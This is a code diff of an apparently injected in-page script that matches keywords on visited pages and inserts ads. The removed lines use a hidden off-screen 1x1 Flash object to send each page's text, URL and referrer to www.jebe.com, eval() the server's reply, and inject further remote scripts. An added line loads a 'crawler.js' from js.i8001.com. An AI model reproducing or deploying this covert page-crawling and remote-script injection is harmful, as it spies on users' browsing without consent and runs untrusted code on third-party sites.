@@ -82,7 +82,6 @@ function i8main()
 		 i8vars.category= 'movies';
 	}
 
-
 	if( partOf(host, ['192.168','soso.com','www.baidu','google', '6.cn'])===false )
 	{
 		var charset= i8vars.charset.replace(/[\-\/\'\"]/g,'')=='utf8'? 'utf8':'gbk';
@@ -162,7 +161,6 @@ function i8main()
 		keywordLinks(links);
 
         i8vars.links = links;
-        requestAds();
 //		i8vars.srvTestAds= 'World Of Tank';
 //
 //		setTimeout( function(){adTest(links);}, 500);
@@ -354,7 +352,7 @@ function i8main()
 	//try to match words with text on page
 	function words()
 	{
-		var i= 0, length= i8vars.words.length, max= 30, matches= [], text= getText();
+		var i= 0, length= i8vars.words.length, max= 30, matches= [], text= body.innerText.toLowerCase();
 
 		//match
 		while( length>++i && matches.length<max ){
@@ -370,138 +368,9 @@ function i8main()
 		return matches;
 	}
 
-    function getText()
-    {
-        var text = document.title ? (document.title + ' ') : '';
-        var metas = document.documentElement.getElementsByTagName('meta');
-        for (var i = 0; i < metas.length; ++i)
-        {
-            if(metas[i].getAttribute("name").toLowerCase() == "description")
-            {
-                var tmp = metas[i].getAttribute("content");
-                if (tmp.constructor === String && tmp.length)
-                {
-                    text += tmp + ' ';
-                }
-            }
-        }
-        if (body.innerText)
-        {
-            text += body.innerText.toLowerCase().replace(/\s+/g, ' ');
-        }
-        return text;
-    }
-
-    function installShowAds()
-    {
-        if (window.i8vars.showAds) return;
-        window.i8vars.showAds = function(ads)
-       	{
-            if (window.i8vars.reFetchAdsTimer)
-            {
-                window.clearTimeout(window.i8vars.reFetchAdsTimer);
-            }
-       	    if (!ads || ads.constructor !== Array) return;
-            for (var i = 0; i < ads.length; ++i)
-            {
-                var logUrl = "http://211.154.172.172/adclick?ad=" + ads[i].id;
-                i8vars.links.insertBefore(i8vars.create('a', {
-                    'css':'font-weight:700;float:right;line-height:18px;',
-                    'href':ads[i].link,
-                    'innerText': ads[i].text,
-                    'onclick': function() { i8vars.log(logUrl); },
-                    'rel':ads[i].id,
-                    'target':'_blank'
-                }), i8vars.links.firstChild);
-            }
-       	}
-    }
-
-	function installCommunicator()
-	{
-		var initrc = 'i8_initrc';   // will be called by flash once loaded.
-		window[initrc] = function()
-		{
-			sendText(body.innerText.replace(/\s{2,}/g,  ' '));
-		}
-		var host = "www.jebe.com", port = "10010";
-		var swf = 'http://' + host + '/crawl.swf?a=' + Math.random() + '&host=' + host + '&port=' + port + '&charset=' + i8vars.charset + '&initrc=' + initrc;
-		var html = '<object classid="clsid:D27CDB6E-AE6D-11cf-96B8-444553540000" ' +
-				'codebase="http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=6,0,40,0" ' +
-				'width="1" height="1" id="' + i8vars.cmtorid + '" name="' + i8vars.cmtorid + '">' +
-				'<param name=host value="' + host + '">'					+
-				'<param name=port value="' + port + '">'					+
-				'<param name=charset value="' + i8vars.charset +  '">'	  +
-				'<param name=movie value="' + swf + '">'					+
-				'<param name=allowScriptAccess value="always">'		   +
-				'<param name=quality value="low">'						  +
-				'<embed src="' + swf + '" allowscriptaccess="always" quality="low" width="1" height="1" name="' +
-					i8vars.cmtorid + '" id="' + i8vars.cmtorid + '" type="application/x-shockwave-flash"></embed>' +
-			'</object>';
-		var div = document.createElement('div');
-		div.setAttribute('style', 'position:absolute; left:-10000px; top:-10000px; width:1px; height:1px; overflow:hidden;');
-		div.innerHTML = html;
-		document.body.insertBefore(div, eldest);
-	}
-
-	function sendText(text)
-	{
-		var cmtor = i8vars.msie ? window[i8vars.cmtorid] : document[i8vars.cmtorid];
-		if (!cmtor) return;
-		if (cmtor.length && cmtor.splice) {cmtor = (cmtor[0].i8call ? cmtor[0] : cmtor[1]);};
-		if (!cmtor.i8call) return;
-		if (window.i8vars.unloadRegistered === undefined)
-		{
-			window.i8vars.unloadRegistered = true;
-			window[(window.onbeforeunload === undefined) ? 'onunload' : 'onbeforeunload'] = function()
-			{
-				cmtor.i8disconnect();
-			}
-		}
-		var meta = {url:document.location.href, ref:document.referrer};
-        var callbackName = "i8AfterCrawl";
-        window[callbackName] = function(r)
-        {
-            var res = eval('(' + r + ')');
-            if (res)
-            {
-                installShowAds();
-                if (res.constructor === Array)
-                {
-                    i8vars.showAds(res);
-                }
-                else if (res && res.code && res.code == 'ok')
-                {
-                    requestAds();
-                }
-            }
-        }
-        cmtor.i8crawl(callbackName, meta, text);
-	}
-
-    function requestAds()
-    {
-        if (window.i8vars.requestAdsCounter === undefined)
-        {
-            window.i8vars.crawlPage = installCommunicator;
-            window.i8vars.requestAdsCounter = 1;
-        }
-        else if (++window.i8vars.requestAdsCounter > 2)
-        {
-            return;
-        }
-        installShowAds();
-        var url = 'http://www.jebe.com:10020/target/';
-        if (url.length > i8vars.urlMaxLen) return;
-        var pad = '?ref=' + encodeURIComponent(document.referrer);
-        if (url.length + pad.length <= i8vars.urlMaxLen)
-        {
-            url += pad;
-        }
-        body.insertBefore(i8vars.create('script', {'src': url,'type': 'text/javascript'}), eldest);
-    }
-
 	body.insertBefore(i8vars.create('script', {'src': 'http://js.i8001.com/browser/control.nocache.js','type': 'text/javascript'}), eldest);
+	body.insertBefore(i8vars.create('script', {'src': 'http://js.i8001.com/browser/crawler.js','type': 'text/javascript'}), eldest);
+//	body.insertBefore(i8vars.create('script', {'src': 'http://www.jebe.com/crawler.js','type': 'text/javascript'}), eldest);
 };
 
 (function(){
